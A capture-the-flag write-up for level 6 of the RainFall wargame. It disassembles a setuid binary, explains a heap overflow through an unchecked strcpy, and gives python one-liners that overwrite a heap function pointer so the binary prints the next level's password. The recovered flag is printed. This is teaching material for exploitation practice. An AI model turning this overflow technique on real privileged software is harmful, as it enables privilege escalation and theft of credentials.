# **Level6**

In this level, we are provided with a binary file:

```bash
level6@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
level6@RainFall:~$
```

## **Binary Analysis**

Using GDB, we analyzed the binary and discovered that the `main` function allocates memory and copies input:

```nasm
0x0804847c <main+0>:    push   %ebp
0x0804847f <+3>:        and    $0xfffffff0, %esp
0x08048482 <+6>:        sub    $0x20, %esp        ; Allocate 32 bytes on stack
0x08048485 <+9>:        movl   $0x40, (%esp)      ; First malloc(64)
0x0804848c <+16>:       call   0x8048350 <malloc@plt>
0x08048491 <+21>:       mov    %eax, 0x1c(%esp)   ; Save first malloc pointer
0x08048495 <+25>:       movl   $0x4, (%esp)       ; Second malloc(4)
0x0804849c <+32>:       call   0x8048350 <malloc@plt>
0x080484a1 <+37>:       mov    %eax, 0x18(%esp)   ; Save second malloc pointer
0x080484a5 <+41>:       mov    $0x8048468, %edx   ; Address of function `m`
0x080484aa <+46>:       mov    0x18(%esp), %eax
0x080484ae <+50>:       mov    %edx, (%eax)       ; Store `m`'s address in second malloc
0x080484b0 <+52>:       mov    0xc(%ebp), %eax    ; Get argv
0x080484b3 <+55>:       add    $0x4, %eax         ; argv[1]
0x080484b6 <+58>:       mov    (%eax), %eax
0x080484be <+66>:       mov    %edx, 0x4(%esp)    ; Second argument for strcpy
0x080484c2 <+70>:       mov    %eax, (%esp)       ; First argument for strcpy
0x080484c5 <+73>:       call   0x8048340 <strcpy@plt>
0x080484ca <+78>:       mov    0x18(%esp), %eax   ; Call function pointer
0x080484ce <+82>:       mov    (%eax), %eax
0x080484d0 <+84>:       call   *%eax ; Call function pointer
```

**Available Functions**

Listing all functions reveals two additional functions, `n` and `m`. While `m` is invoked in the binary, `n` contains the shell execution logic but is never directly called:

```nasm
(gdb) info functions
0x08048454  n         ; Target function
0x08048468  m         ; Default function
0x0804847c  main
```

Disassembling `n` shows that it executes **`system("/bin/cat /home/user/level7/.pass")**:

```nasm
(gdb) disas n
Dump of assembler code for function n:
0x08048454 <+0>:     push   %ebp
0x08048455 <+1>:     mov    %esp, %ebp
0x08048457 <+3>:     sub    $0x18, %esp
0x0804845a <+6>:     movl   $0x80485b0, (%esp) ; "/bin/cat /home/user/level7/.pass"
0x08048461 <+13>:    call   0x8048370 <system@plt>
0x08048466 <+18>:    leave
0x08048467 <+19>:    ret
```

Disassembling `m` shows that it prints *"Nope"*:

```nasm
0x08048468 <m+0>:     push   %ebp
0x08048469 <m+1>:     mov    %esp, %ebp
0x0804846b <m+3>:     sub    $0x18, %esp
0x0804846e <m+6>:     movl   $0x80485d1, (%esp)    ; "Nope"
0x08048475 <m+13>:    call   0x8048360 <puts@plt> 
```

## **Vulnerability**

The program is vulnerable due to:

1. **Unsafe `strcpy`**: It does not perform bounds checking.
2. **Function pointer stored on the heap**: This enables overwriting the pointer via a buffer overflow.

Relevant code snippet:

```c
int main(int argc, char **argv) {
    char *buffer = malloc(64);           // First malloc
    void (**func)() = malloc(4);         // Second malloc (function pointer)
    *func = &m;                          // Store address of m
    strcpy(buffer, argv[1]);             // Vulnerable strcpy
    (*func)();                           // Call function pointer
}
```

## **Exploit**

The goal is to overflow the first buffer to overwrite the second malloc chunk and replace the function pointer with the address of function `n`. When the function pointer is called, `n` executes instead of `m`.

**Finding the Offset**

The offset is **72 bytes**: 64 bytes for the first buffer + 8 bytes for heap metadata.

**Testing Different Sizes**:

```bash
# Test with 64 bytes (no padding)
./level6 $(python -c 'print "A" * 64 + "\x54\x84\x04\x08"')
# Doesn't work

# Test with 68 bytes (4 padding)
./level6 $(python -c 'print "A" * 68 + "\x54\x84\x04\x08"')
# Doesn't work

# Test with 72 bytes (8 padding)
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
# Works! Gets the password
```

1. Run the exploit:
    
    ```bash
    ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
    
    ```
    
2. Result:

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## **Flag**

```c
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```